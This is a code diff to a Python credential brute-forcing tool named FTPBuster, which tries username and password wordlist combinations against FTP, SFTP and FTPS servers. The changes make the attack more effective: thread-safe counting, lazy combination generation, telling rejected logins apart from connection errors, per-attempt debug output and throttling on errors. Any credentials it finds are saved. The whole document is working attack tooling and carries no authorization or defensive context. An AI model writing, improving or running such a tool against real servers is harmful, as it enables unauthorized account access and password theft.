@@ -7,6 +7,8 @@
 
 
 import ftplib
+from ftplib import error_perm, error_temp
+import socket
 import paramiko
 import argparse
 import concurrent.futures
@@ -41,6 +43,8 @@ class FTPBuster:
         self.tried = 0
         self.start_time = time.time()
         self.total_combinations = 0
+        self.debug = False
+        self.lock = threading.Lock()
 
         if self.protocol not in ['FTP', 'SFTP', 'FTPS']:
             raise ValueError("Protocol must be one of: FTP, SFTP, FTPS")
@@ -64,62 +68,109 @@ class FTPBuster:
             sys.exit(1)
 
     def get_credentials(self):
-        if self.single_user and self.single_pass:
+         if self.single_user and self.single_pass:
+            self.total_combinations = 1
             return [(self.single_user, self.single_pass)]
 
-        users = [self.single_user] if self.single_user else self.read_wordlist(self.user_file)
-        passwords = [self.single_pass] if self.single_pass else self.read_wordlist(self.pass_file)
+         users = [self.single_user] if self.single_user else self.read_wordlist(self.user_file)
+         passwords = [self.single_pass] if self.single_pass else self.read_wordlist(self.pass_file)
 
-        combos = list(itertools.product(users, passwords))
-        self.total_combinations = len(combos)
-        return combos
+         self.total_combinations = len(users) * len(passwords)
+         return itertools.product(users, passwords)
 
     def try_login(self, user, password):
         if self.stop_event.is_set():
             return (False, None, None)
 
-        self.tried += 1
+        with self.lock:
+             self.tried += 1
 
         try:
             if self.protocol == 'FTP':
-                return (self.try_ftp(user, password), user, password)
+                result = self.try_ftp(user, password)
             elif self.protocol == 'SFTP':
-                return (self.try_sftp(user, password), user, password)
-            elif self.protocol == 'FTPS':
-                return (self.try_ftps(user, password), user, password)
-        except:
-            return (False, None, None)
+                result = self.try_sftp(user, password)
+            else:
+                result = self.try_ftps(user, password)
+            if self.debug:
+                print(f"\n[DEBUG] {user}:{password} -> {result}", flush=True)
+            return (result, user, password)
+        except Exception:
+            return (None, user, password)
 
     def try_ftp(self, user, password):
-        try:
-            ftp = ftplib.FTP(timeout=self.timeout)
-            ftp.connect(self.target, self.port)
-            ftp.login(user, password)
-            ftp.quit()
-            return True
-        except:
-            return False
+         ftp = None
+         try:
+             ftp = ftplib.FTP(timeout=self.timeout)
+             ftp.connect(self.target, self.port)
+             ftp.login(user, password)
+             return True
+
+         except error_perm as e:
+               if str(e).startswith("530"):
+                   return False 
+               return None
+
+         except (error_temp, socket.timeout, ConnectionRefusedError):
+                return None
+
+         except Exception:
+                return None
+         finally:
+                 if ftp:
+                     try:
+                         ftp.quit()
+                     except:
+                            pass
 
     def try_sftp(self, user, password):
-        try:
-            transport = paramiko.Transport((self.target, self.port))
-            transport.connect(username=user, password=password)
-            transport.close()
-            return True
-        except:
-            return False
+         sock = None
+         transport = None
+         try:
+             sock = socket.create_connection((self.target, self.port), timeout=self.timeout)
+             transport = paramiko.Transport(sock)
+             transport.banner_timeout = self.timeout
+             transport.auth_timeout = self.timeout
+
+             transport.connect(username=user, password=password)
+
+             sftp = paramiko.SFTPClient.from_transport(transport)
+             sftp.close()
+
+             return True
+
+         except paramiko.AuthenticationException:
+                return False
+
+         except (paramiko.SSHException, socket.timeout, ConnectionRefusedError):
+                return None
+
+         except Exception:
+                return None
+
+         finally:
+                 if transport:
+                     transport.close()
+                 if sock:
+                     sock.close()
 
     def try_ftps(self, user, password):
-        try:
-            context = ssl.create_default_context()
-            ftps = ftplib.FTP_TLS(context=context, timeout=self.timeout)
-            ftps.connect(self.target, self.port)
-            ftps.login(user, password)
-            ftps.prot_p()
-            ftps.quit()
-            return True
-        except:
-            return False
+         try:
+             context = ssl.create_default_context()
+             ftps = ftplib.FTP_TLS(context=context, timeout=self.timeout)
+             ftps.connect(self.target, self.port)
+             ftps.login(user, password)
+             ftps.prot_p()
+             ftps.quit()
+             return True
+
+         except ftplib.error_perm as e:
+                 if str(e).startswith("530"):
+                    return False
+                 return None
+
+         except Exception:
+                return None
 
     def show_progress(self, final=False):
         elapsed = time.time() - self.start_time
@@ -156,7 +207,7 @@ class FTPBuster:
             credentials = self.get_credentials()
 
             print(f"{CYAN}[*] Target: {self.protocol}://{self.target}:{self.port}{RESET}")
-            print(f"{CYAN}[*] Total combinations: {len(credentials)}{RESET}")
+            print(f"{CYAN}[*] Total combinations: {self.total_combinations}{RESET}")
             print(f"{CYAN}[*] Threads: {self.threads}{RESET}")
             print(f"{CYAN}[*] Timeout: {self.timeout}s{RESET}")
             if self.outfile:
@@ -175,12 +226,14 @@ class FTPBuster:
                         result, user, password = future.result()
                         futures.pop(future)
 
-                        if result:
+                        if result is True:
                             self.stop_event.set()
                             self.show_progress(final=True)
                             print(f"\n{GREEN}[+] SUCCESS: {user}:{password}{RESET}")
                             self.save_credentials(user, password)
                             return
+                        elif result is None:
+                              time.sleep(0.03)
 
                         if not self.stop_event.is_set():
                             try:
@@ -209,6 +262,7 @@ def main():
 
     parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
     parser.add_argument("-P", "--protocol", required=True, choices=['FTP', 'SFTP', 'FTPS'], help="Protocol")
+    parser.add_argument("--debug", action="store_true", help="Enable debug output")
 
     user_group = parser.add_mutually_exclusive_group(required=True)
     user_group.add_argument("-u", "--user-file", help="Username wordlist")
@@ -237,7 +291,7 @@ def main():
         timeout=args.timeout,
         outfile=args.outfile
     )
-
+    tool.debug = args.debug
     tool.run_attack()
 
 if __name__ == "__main__":
